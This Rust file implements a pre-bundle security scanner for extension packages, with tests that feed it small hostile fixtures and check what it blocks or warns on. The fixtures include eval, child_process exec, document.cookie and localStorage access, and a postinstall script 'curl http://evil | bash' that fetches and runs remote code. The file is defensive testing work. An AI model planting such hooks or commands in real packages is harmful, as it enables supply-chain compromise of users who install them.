//! Pre-bundle AST security scanning (SEC001–SEC012 + SEC011).

use std::path::Path;

use super::engine::scan_source_file;
use super::file_discovery::find_files_to_scan;
use super::is_blocked;
use super::scripts_scanner::scan_package_scripts;
use super::types::{ScanReport, build_summary};

/// Orchestrate a full pre-bundle security scan of an extension package directory.
///
/// 1. Scan `package.json` lifecycle scripts (SEC011, warn)
/// 2. Discover source files (respecting excludes)
/// 3. AST-scan each file with oxc (SEC001–SEC010, SEC012)
///
/// Returns `Err` when the package directory cannot be scanned
pub fn scan_extension(package_dir: &Path) -> Result<ScanReport, String> {
    let mut findings = Vec::new();

    let package_json = package_dir.join("package.json");
    findings.extend(scan_package_scripts(&package_json));

    let files = find_files_to_scan(package_dir)
        .map_err(|e| format!("unable to perform security scan: {e}"))?;
    let scanned_files = files.len();

    for path in &files {
        let source = std::fs::read_to_string(path).map_err(|e| {
            format!(
                "unable to perform security scan: failed to read '{}': {e}",
                path.display()
            )
        })?;
        let path_str = path.display().to_string();
        findings.extend(scan_source_file(&path_str, &source));
    }

    findings.sort_by(|a, b| a.file.cmp(&b.file).then(a.line.cmp(&b.line)));
    let summary = build_summary(&findings);
    let blocked = is_blocked(&findings);
    Ok(ScanReport {
        findings,
        blocked,
        summary,
        scanned_files,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::extension::Severity;

    fn scan(dir: &Path) -> ScanReport {
        scan_extension(dir).expect("scan should succeed")
    }

    #[test]
    fn sec001_blocks_eval() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(dir.path().join("bad.ts"), " console.log(eval('1+1'));\n").expect("write");
        let report = scan(dir.path());
        assert!(report.blocked, "{:?}", report.findings);
        assert!(
            report.findings.iter().any(|f| f.rule_id == "SEC001"),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn sec002_blocks_child_process_alias() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("bad.ts"),
            "import cp from 'child_process';\ncp.exec('ls');\n",
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(report.blocked, "{:?}", report.findings);
        assert!(
            report.findings.iter().any(|f| f.rule_id == "SEC002"),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn sec008_warns_on_url_embedded_in_string() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("url.ts"),
            "const msg = 'See https://evil.example/path';\n",
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(!report.blocked, "{:?}", report.findings);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "SEC008" && f.severity == Severity::Warn),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn sec008_warns_on_template_literal_url() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("url.ts"),
            "const msg = `https://evil.example/path`;\n",
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(
            report.findings.iter().any(|f| f.rule_id == "SEC008"),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn sec011_warns_but_does_not_block() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"x","scripts":{"postinstall":"curl http://evil | bash"}}"#,
        )
        .expect("write");
        std::fs::write(dir.path().join("ok.ts"), "export const x = 1;\n").expect("write");
        let report = scan(dir.path());
        assert!(!report.blocked, "{:?}", report.findings);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "SEC011" && f.severity == Severity::Warn),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn sec012_allows_container_query_selector() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("ui.ts"),
            "export function mount(container) {\n  container.querySelector('.x');\n}\n",
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(
            !report.findings.iter().any(|f| f.rule_id == "SEC012"),
            "container.querySelector must be allowed: {:?}",
            report.findings
        );
        assert!(!report.blocked, "{:?}", report.findings);
    }

    #[test]
    fn sec012_blocks_destructured_host_container_escapes() {
        // TS SEC012 fixture shape: mount({ container }) still treats container
        // as the host binding (not a free-variable shadow).
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("mount.ts"),
            r#"
export function mount({ container }) {
  container.closest('#checkout-root');
  container.ownerDocument;
  container.parentElement;
  container.parentNode;
}
"#,
        )
        .expect("write");
        let report = scan(dir.path());
        let sec012 = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SEC012")
            .count();
        assert!(
            sec012 >= 4,
            "expected host container escapes to block, got {sec012}: {:?}",
            report.findings
        );
        assert!(report.blocked, "{:?}", report.findings);
    }

    #[test]
    fn sec012_blocks_document_destructure_and_computed_access() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("destructure.ts"),
            r#"
const { body } = document;
window["document"].querySelector('a');
"#,
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(report.blocked, "{:?}", report.findings);
        assert!(
            report.findings.iter().any(|f| f.rule_id == "SEC012"),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn sec012_allows_shadowed_open_and_document() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("shadow.ts"),
            r#"
function open(msg: string) { console.log(msg); }
open("hi");

function render(document: { title: string }) {
  return document.title;
}
"#,
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(
            !report.findings.iter().any(|f| f.rule_id == "SEC012"),
            "shadowed open/document must be allowed: {:?}",
            report.findings
        );
    }

    #[test]
    fn sec012_alias_still_blocks_and_local_shadow_clears_alias() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("alias.ts"),
            r#"
const doc = document;
doc.body;

function wrap() {
  const doc = { body: null };
  return doc.body;
}
"#,
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(
            report.findings.iter().any(|f| f.rule_id == "SEC012"),
            "alias doc.body must block: {:?}",
            report.findings
        );
        let sec012 = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SEC012")
            .count();
        assert_eq!(sec012, 1, "{:?}", report.findings);
    }

    #[test]
    fn sec012_blocks_document_body_and_window_open() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("escape.ts"),
            "const b = document.body;\nwindow.open('https://example.com');\n",
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(report.blocked, "{:?}", report.findings);
        assert!(
            report.findings.iter().any(|f| f.rule_id == "SEC012"),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn sec012_blocks_nested_window_document_query() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("nested.ts"),
            "window.document.querySelector('body');\n",
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(report.blocked, "{:?}", report.findings);
        assert!(
            report.findings.iter().any(|f| f.rule_id == "SEC012"),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn sec012_blocks_element_access_and_local_storage() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("access.ts"),
            "const c = document['cookie'];\nconst s = localStorage;\n",
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(report.blocked, "{:?}", report.findings);
        let sec012: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SEC012")
            .collect();
        assert!(sec012.len() >= 2, "{sec012:?}");
    }

    #[test]
    fn sec012_blocks_container_closest_only() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("closest.ts"),
            "container.closest('.host');\n",
        )
        .expect("write");
        let report = scan(dir.path());
        assert!(report.blocked, "{:?}", report.findings);
        assert!(
            report.findings.iter().any(|f| f.rule_id == "SEC012"),
            "{:?}",
            report.findings
        );
    }

    #[test]
    fn clean_package_passes() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(dir.path().join("ok.ts"), "export const hello = 'world';\n").expect("write");
        let report = scan(dir.path());
        assert!(!report.blocked, "{:?}", report.findings);
        assert!(report.findings.is_empty(), "{:?}", report.findings);
    }

    #[test]
    fn excludes_node_modules() {
        let dir = tempfile::tempdir().expect("tempdir");
        let nm = dir.path().join("node_modules/evil");
        std::fs::create_dir_all(&nm).expect("mkdir");
        std::fs::write(nm.join("bad.ts"), "eval('x');\n").expect("write");
        std::fs::write(dir.path().join("ok.ts"), "export const x = 1;\n").expect("write");
        let report = scan(dir.path());
        assert!(!report.blocked, "{:?}", report.findings);
        assert_eq!(report.scanned_files, 1, "{report:?}");
    }

    #[test]
    fn discovery_fails_when_path_is_not_directory() {
        let dir = tempfile::tempdir().expect("tempdir");
        let file = dir.path().join("not-a-dir.ts");
        std::fs::write(&file, "export {};\n").expect("write");
        let err = scan_extension(&file).expect_err("should fail");
        assert!(
            err.contains("unable to perform security scan"),
            "unexpected err: {err}"
        );
    }
}
